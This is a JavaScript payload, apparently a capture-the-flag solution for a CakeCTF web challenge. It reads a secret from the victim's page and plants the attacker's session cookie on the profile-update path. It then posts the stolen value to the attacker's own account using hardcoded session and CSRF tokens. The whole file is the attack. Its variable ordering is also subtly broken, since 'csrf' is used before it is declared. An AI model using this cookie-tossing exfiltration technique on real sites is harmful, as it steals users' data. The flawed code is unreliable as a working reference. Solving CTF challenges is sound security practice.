// Get flag
fetch("/")
    .then(response => response.text())
    .then((response) => {
        flag = /CakeCTF{.*}/.exec(response);
        data = `bio=${flag}&csrf_token=${csrf}`;
        console.log(data)

        // Set our account cookie for /api/user/update
        document.cookie = "session=eyJjc3JmX3Rva2VuIjoiMTUzYzA2ODMzZDk1NWRiM2M4MmMxODIyYmYxZDQ0ZTFiMDcwZTkzNiIsInVzZXIiOiIxMjM0NTY3OCJ9.Yxh3-g.mqjVeY5lvB4EMvLMSUL29U3GdL0; path=/api/user/update"

        // Set csrf_token to our csrf_token
        let csrf = "IjE1M2MwNjgzM2Q5NTVkYjNjODJjMTgyMmJmMWQ0NGUxYjA3MGU5MzYi.Yxh3_w.06-nLfjC9U4peAdIbAp2OPrFEHs";

        // Post flag to our profile
        fetch("/api/user/update", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
            },
            body: data
        })
    })
